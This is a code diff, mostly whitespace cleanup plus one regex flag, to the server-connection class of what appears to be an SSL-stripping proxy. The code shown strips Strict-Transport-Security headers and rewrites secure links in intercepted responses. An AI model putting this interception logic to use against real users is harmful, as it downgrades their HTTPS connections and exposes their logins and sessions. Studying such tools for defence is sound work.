@@ -74,7 +74,7 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "HTTP connection made.")
         self.sendRequest()
         self.sendHeaders()
-        
+
         if (self.command == 'POST'):
             self.sendPostData()
 
@@ -105,7 +105,7 @@ class ServerConnection(HTTPClient):
         	logging.log(self.getLogLevel(), "LEO Erasing Strict Transport Security....")
         else:
             self.client.setHeader(key, value)
-            
+
 
     def handleEndHeaders(self):
        if (self.isImageRequest and self.contentLength != None):
@@ -113,7 +113,7 @@ class ServerConnection(HTTPClient):
 
        if self.length == 0:
            self.shutdown()
-                        
+
     def handleResponsePart(self, data):
         if (self.isImageRequest):
             self.client.write(data)
@@ -130,7 +130,7 @@ class ServerConnection(HTTPClient):
         if (self.isCompressed):
             logging.debug("Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-            
+
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
         #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )
 
@@ -139,7 +139,7 @@ class ServerConnection(HTTPClient):
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
-        
+
         self.client.write(data)
         self.shutdown()
 
@@ -149,23 +149,23 @@ class ServerConnection(HTTPClient):
         if len(patchDict)>0:
         	dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
         	data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
-		
-		iterator = re.finditer(ServerConnection.urlExpression, data)       
+
+		iterator = re.finditer(ServerConnection.urlExpression, data)
         for match in iterator:
             url = match.group()
-			
+
             logging.debug("Found secure reference: " + url)
             nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
             logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
             sustitucion[url] = nuevaurl
             #data.replace(url,nuevaurl)
-        
+
         #data = self.urlMonitor.DataReemplazo(data)
         if len(sustitucion)>0:
-        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
+        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())), re.UNICODE)
         	data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
-        
-        #logging.debug("LEO DEBUG received data:\n"+data)	
+
+        #logging.debug("LEO DEBUG received data:\n"+data)
         #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
         #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
         #if data.find("http://w.face")!=-1:
@@ -180,5 +180,3 @@ class ServerConnection(HTTPClient):
             self.shutdownComplete = True
             self.client.finish()
             self.transport.loseConnection()
-
-
